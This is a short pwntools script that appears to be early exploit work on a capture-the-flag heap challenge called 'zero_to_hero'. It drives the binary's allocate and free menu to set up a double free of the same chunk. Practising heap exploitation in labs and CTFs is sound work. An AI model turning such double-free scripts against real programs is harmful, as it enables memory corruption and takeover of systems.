from pwn import *
context.binary = ELF("./zero_to_hero", checksec=False)
ld = "./ld-2.29.so"
libc = "./libc.so.6"

def start():
    return process([ld, context.binary.path], env={"LD_PRELOAD": libc})

p = start()
p.sendlineafter(b"hero?\n", b"y")

def add(size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(size).encode())
    p.sendafter(b"> ", data)

def remove(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())

add(0x80, b"A"*0x80) # idx0
add(0x80, b"B"*0x80) # idx1 separate chunk
remove(0)
add(0x80, b"C"*0x80) # idx2 reuses chunk0?
remove(0)
remove(1)
p.interactive()
